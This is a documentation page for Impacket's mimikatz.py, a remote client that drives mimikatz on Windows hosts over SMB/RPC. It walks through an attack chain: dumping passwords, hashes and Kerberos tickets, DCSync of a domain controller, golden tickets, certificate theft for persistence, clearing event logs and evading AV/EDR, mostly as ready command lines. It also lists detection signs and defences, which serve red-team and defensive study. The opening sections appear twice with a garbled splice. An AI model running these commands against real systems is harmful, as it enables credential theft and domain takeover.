# mimikatz.py

## Overview
`mimikatz.py` is a remote mimikatz RPC client that connects to and controls a remote mimikatz RPC server. This tool provides a mini shell interface to execute mimikatz commands on remote systems through DCE/RPC, allowing credential extraction and other mimikatz functionality remotely.

## Detailed Description
This script implements a client for the mimikatz RPC server developed by Benjamin Delpy (@gentilkiwi). It establishes an SMB connection and uses DCE/RPC to communicate with a remote mimikatz instance running as an RPC server. The tool provides an interactive shell where users can execute mimikatz commands remotely, making it useful for credential extraction, token manipulation, and other post-exploitation activities without directly placing mimikatz binaries on the target system.

The tool is particularly valuable in scenarios where:
- Direct mimikatz execution is blocked by AV/EDR
- Remote credential extraction is needed
- Centralized mimikatz control is required
- Avoiding file-based detection is important

### Key Features:
- **Remote Mimikatz Control**: Execute mimikatz commands on remote systems via RPC
- **Interactive Shell**: Mini shell interface for command execution
- **Script Support**: Execute commands from input files
- **Encrypted Communication**: Uses DCE/RPC with encryption for secure communication
- **Credential Flexibility**: Support for multiple authentication methods
- **Session Management**: Maintain persistent connection for multiple commands

### Technical Details:
- Implements DCE/RPC client for mimikatz RPC server
- Uses SMB transport for RPC communication
- Supports Kerberos and NTLM authentication
- Requires mimikatz RPC server to be running on target
- Compatible with standard mimikatz command syntaxerview
`mimikatz.py` is a remote mimikatz RPC client that connects to and controls a remote mimikatz RPC server. This tool provides a mini shell interface to execute mimikatz commands on remote systems through DCE/RPC, allowing credential extraction and other mimikatz functionality remotely.

## Detailed Description
This script implements a client for the mimikatz RPC server developed by Benjamin Delpy (@gentilkiwi). It establishes an SMB connection and uses DCE/RPC to communicate with a remote mimikatz instance running as an RPC server. The tool provides an interactive shell where users can execute mimikatz commands remotely, making it useful for credential extraction, token manipulation, and other post-exploitation activities without directly placing mimikatz binaries on the target system.

The tool is particularly valuable in scenarios where:
- Direct mimikatz execution is blocked by AV/EDR
- Remote credential extraction is needed
- Centralized mimikatz control is required
- Avoiding file-based detection is important

### Key Features:
- **Remote Mimikatz Control**: Execute mimikatz commands on remote systems via RPC
- **Interactive Shell**: Mini shell interface for command execution
- **Script Support**: Execute commands from input files
- **Encrypted Communication**: Uses DCE/RPC with encryption for secure communication
- **Credential Flexibility**: Support for multiple authentication methods
- **Session Management**: Maintain persistent connection for multiple commands

### Technical Details:
- Implements DCE/RPC client for mimikatz RPC server
- Uses SMB transport for RPC communication
- Supports Kerberos and NTLM authentication
- Requires mimikatz RPC server to be running on target
- Compatible with standard mimikatz command syntax

## Command Line Options

```
usage: mimikatz.py [-h] [-file FILE] [-debug] [-ts] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                   [-dc-ip ip address] [-target-ip ip address]
                   target

SMB client implementation.

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Execution Options:
  -file FILE            Input file with commands to execute in the mini shell
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)

Connection:
  -dc-ip ip address     IP Address of the domain controller
  -target-ip ip address IP Address of the target machine
```
## Usage Examples

### Interactive Shell
```bash
# Connect with password authentication
python3 mimikatz.py domain.local/admin:password@target.domain.local

# Connect with NTLM hash
python3 mimikatz.py -hashes :ntlmhash domain.local/admin@target.domain.local

# Connect with Kerberos authentication
python3 mimikatz.py -k domain.local/admin@target.domain.local

# Connect with explicit IP addresses
python3 mimikatz.py -dc-ip 192.168.1.10 -target-ip 192.168.1.20 domain.local/admin:password@target
```

### Script Execution
```bash
# Execute commands from file
python3 mimikatz.py domain.local/admin:password@target.domain.local -file commands.txt

# Example commands.txt content:
# sekurlsa::logonpasswords
# sekurlsa::wdigest
# sekurlsa::tickets
# exit
```

### Common Mimikatz Commands (once connected)
```bash
# In the mimikatz shell:

# Extract plaintext passwords and hashes
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets

# Extract WDigest passwords
sekurlsa::wdigest

# Extract LSA secrets
lsadump::secrets

# Dump SAM database
lsadump::sam

# Token manipulation
token::elevate
token::whoami

# Privilege escalation
privilege::debug

# Export certificates
crypto::capi

# Clear event logs
event::clear
```

### Debug and Logging
```bash
# Enable debug output for troubleshooting
python3 mimikatz.py -debug domain.local/admin:password@target.domain.local

# Add timestamps to output
python3 mimikatz.py -ts domain.local/admin:password@target.domain.local

# Combined debug and timestamps
python3 mimikatz.py -debug -ts domain.local/admin:password@target.domain.local
```

## Attack Chain Integration

### Remote Credential Extraction
```bash
# Step 1: Gain initial access and deploy mimikatz RPC server
# (via PSExec, WMI, or other method)

# Step 2: Connect remotely and extract credentials
python3 mimikatz.py domain.local/admin:password@target.domain.local
# In shell: sekurlsa::logonpasswords

# Step 3: Use extracted credentials for lateral movement
python3 psexec.py domain.local/extracteduser:extractedpass@next-target.domain.local
```

### Kerberos Ticket Extraction and Injection
```bash
# Step 1: Connect to compromised system
python3 mimikatz.py domain.local/admin:password@dc.domain.local

# Step 2: Extract Kerberos tickets
# In shell: sekurlsa::tickets /export

# Step 3: Convert and use tickets
python3 ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
python3 psexec.py -k -no-pass domain.local/user@target.domain.local
```

### Domain Controller Compromise
```bash
# Step 1: Connect to domain controller
python3 mimikatz.py domain.local/admin:password@dc.domain.local

# Step 2: Extract NTDS database
# In shell: lsadump::dcsync /domain:domain.local /all

# Step 3: Use extracted hashes for Golden Ticket
python3 ticketer.py -nthash [krbtgt_hash] -domain-sid S-1-5-21-xxx -domain domain.local administrator
```

### Certificate Extraction for Persistence
```bash
# Step 1: Connect to target with certificate services
python3 mimikatz.py domain.local/admin:password@ca.domain.local

# Step 2: Extract certificates
# In shell: crypto::capi
# In shell: crypto::cng

# Step 3: Use certificates for authentication
# Install extracted certificates for persistent access
```

### Memory Dump Analysis
```bash
# Step 1: Create memory dump on target (via other tools)

# Step 2: Connect and analyze dump
python3 mimikatz.py domain.local/admin:password@target.domain.local

# Step 3: Process dump file
# In shell: sekurlsa::minidump dump.dmp
# In shell: sekurlsa::logonpasswords
```

## Prerequisites
- Python 3.x with Impacket installed
- Mimikatz RPC server running on target system
- Administrative credentials for target system
- Network access to target via SMB (445/tcp)
- Understanding of mimikatz command syntax
- Appropriate crypto libraries (pycryptodomex)

## Mimikatz RPC Server Setup
Before using this client, the mimikatz RPC server must be running on the target:

```cmd
# On target Windows system (as Administrator):
mimikatz.exe
mimikatz # rpc::server

# Or start as service:
mimikatz.exe "rpc::server" exit
```

## Detection Considerations
- **Network Indicators**:
  - SMB connections to systems running mimikatz RPC
  - DCE/RPC traffic patterns associated with mimikatz
  - Unusual RPC endpoint registrations
- **System Indicators**:
  - Mimikatz process running with RPC server mode
  - Memory access patterns typical of credential extraction
  - Registry access for certificate extraction
- **Behavioral Indicators**:
  - Remote credential extraction activities
  - Unusual authentication patterns post-extraction
  - Privilege escalation following RPC connections

## Defensive Measures
- **Endpoint Protection**:
  - Deploy advanced EDR solutions to detect mimikatz
  - Implement application whitelisting
  - Monitor for RPC server registrations
- **Network Security**:
  - Monitor SMB traffic for unusual patterns
  - Implement network segmentation
  - Deploy network-based behavioral analysis
- **Credential Protection**:
  - Enable Windows Credential Guard
  - Implement LAPS for local admin passwords
  - Use protected process light for LSA
- **Monitoring and Logging**:
  - Enable detailed process monitoring
  - Log RPC activities and endpoint registrations
  - Monitor memory access and injection attempts

## Common Issues and Troubleshooting

### RPC Server Not Running
```bash
# Error: Connection refused or RPC endpoint not found
# Solution: Ensure mimikatz RPC server is running on target
# On target: mimikatz.exe "rpc::server" exit
```

### Authentication Failures
```bash
# Error: Access denied or authentication failed
# Solution: Verify credentials and administrative privileges
python3 mimikatz.py -debug domain.local/admin:password@target
# Check if user has necessary privileges on target system
```

### Crypto Library Missing
```bash
# Error: "You don't have any crypto installed"
# Solution: Install required crypto library
pip install pycryptodomex
```

### Network Connectivity Issues
```bash
# Error: Connection timeout or network unreachable
# Solution: Verify network connectivity and firewall settings
# Check SMB access: smbclient -L target
# Verify RPC ports are accessible
```

### Permission Denied on Target
```bash
# Error: Commands fail with access denied
# Solution: Ensure mimikatz has debug privileges
# On target: mimikatz.exe "privilege::debug" "rpc::server"
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Alternative credential extraction method
- [psexec.py](psexec.md) - Execute commands to deploy mimikatz RPC server
- [wmiexec.py](wmiexec.md) - Alternative execution method for setup
- [smbclient.py](smbclient.md) - SMB connectivity testing
- [ticketConverter.py](ticketConverter.md) - Convert extracted Kerberos tickets
- [ticketer.py](ticketer.md) - Create tickets using extracted hashes

---

*This documentation is based on the actual source code and functionality of mimikatz.py from Impacket.*
